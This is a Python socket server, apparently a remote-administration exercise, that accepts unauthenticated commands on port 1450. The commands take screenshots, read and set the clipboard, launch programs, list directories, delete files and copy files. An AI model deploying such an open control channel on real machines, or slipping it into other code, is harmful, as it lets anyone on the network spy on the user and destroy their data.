import socket
from PIL import ImageGrab
import pyperclip
import subprocess
import os
import shutil
#create the server
server_soc = socket.socket()
server_soc.bind(("0.0.0.0",1450))
server_soc.listen(3)




while True:
    client_soc, addr = server_soc.accept()
    print(f"{addr[0]} - connected")
    while True:
        try:
            data = client_soc.recv(1024).decode()

            print(f"getting data - {data}")
            command = data.lower()
            if command not in ["screenshot", "copy", "paste","software", "data", "delete","copyfile"]:
                break

            if command == "screenshot":
                im = ImageGrab.grab()
                im.save(r'screen.jpg')
                with open(r'screen.jpg', 'rb') as file:
                    data = file.read()
                    client_soc.send(str(len(data)).zfill(6).encode())
                    client_soc.sendall(data)

                continue

            elif command == "copy":
                copy_len = client_soc.recv(2).decode()
                copy = client_soc.recv(int(copy_len)).decode()
                pyperclip.copy(copy)
                ret_ans = "0"
                if copy == pyperclip.paste():#check if it has been copied
                    ret_ans = "1"
                client_soc.send(ret_ans.encode())
                continue
            elif command == "paste":
                data = pyperclip.paste()
                client_soc.send(data.encode())
                continue
            elif command == "software":
                software_len = client_soc.recv(2).decode()
                software = client_soc.recv(int(software_len)).decode()
                ans = "0"
                if shutil.which(software):#check if software is on computer

                    is_open = subprocess.call(software)#try open software
                    if  is_open == 0:
                        ans = "1"

                client_soc.send(ans.encode())
                continue
            elif command == "data":
                file_loc_len = client_soc.recv(2).decode()
                file_loc = client_soc.recv(int(file_loc_len)).decode()
                if os.path.exists(file_loc):#check if file exists
                    file_list = os.listdir(file_loc)
                    file_list = " ".join(file_list)
                    client_soc.send(file_list.encode())
                else:
                    client_soc.send("file doesn't exist ".encode())
                continue
            elif command == "delete":
                file_path_len = client_soc.recv(2).decode()
                file_path = client_soc.recv(int(file_path_len)).decode()

                if os.path.exists(file_path):#check if file exists
                    os.remove(file_path)
                    ret_ans = "1"
                else:
                    ret_ans = "0"
                client_soc.send(ret_ans.encode())

            elif command == "copyfile":
                file_to_copy_len = client_soc.recv(2).decode()
                file_to_copy = client_soc.recv(int(file_to_copy_len)).decode()
                dest_file_len = client_soc.recv(2).decode()
                dest_file = client_soc.recv(int(dest_file_len)).decode()
                ret_ans = "0"

                try:
                    if shutil.copy(file_to_copy, dest_file):
                        ret_ans = "1"
                except Exception:
                    ret_ans = "0"

                client_soc.send(ret_ans.encode())


        except Exception as e:
            print(f"error in recv/send {str(e)}")
            break
    print(f"{addr[0]} - disconnected")
    client_soc.close()